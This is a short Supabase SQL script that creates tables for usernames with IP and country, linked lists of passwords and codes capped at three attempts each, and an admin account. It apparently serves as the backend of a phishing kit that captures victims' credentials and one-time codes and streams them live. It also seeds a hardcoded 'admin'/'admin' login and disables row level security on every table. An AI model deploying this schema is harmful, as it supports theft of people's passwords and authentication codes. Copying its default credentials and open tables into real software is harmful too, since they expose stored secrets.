drop table if exists public.list_code cascade;

drop table if exists public.list_pass cascade;

drop table if exists public.data cascade;

drop table if exists public.config cascade;

drop table if exists public.account cascade;

create table
  public.data (
    id bigint generated always as identity primary key,
    username text not null,
    ip text,
    country text,
    created_at timestamptz default now ()
  );

create table
  public.list_pass (
    id bigint generated always as identity primary key,
    pass text not null,
    data_id bigint references public.data (id)
  );

create table
  public.list_code (
    id bigint generated always as identity primary key,
    code text not null,
    data_id bigint references public.data (id)
  );

create table
  public.config (
    id integer primary key default 1 check (id = 1),
    max_pass int not null,
    max_code int not null
  );

create table
  public.account (
    username text not null default 'admin' check (username = 'admin'),
    pass text not null
  );

insert into
  public.account (username, pass)
values
  ('admin', 'admin');

insert into
  public.config (id, max_pass, max_code)
values
  (1, 3, 3)
on conflict (id) do
update
set
  max_pass = 3,
  max_code = 3;

alter table public.data disable row level security;

alter table public.list_pass disable row level security;

alter table public.list_code disable row level security;

alter table public.config disable row level security;

alter table public.account disable row level security;

begin;

drop publication if exists supabase_realtime;

create publication supabase_realtime;

commit;

alter publication supabase_realtime
add table public.data;

alter publication supabase_realtime
add table public.list_pass;

alter publication supabase_realtime
add table public.list_code;
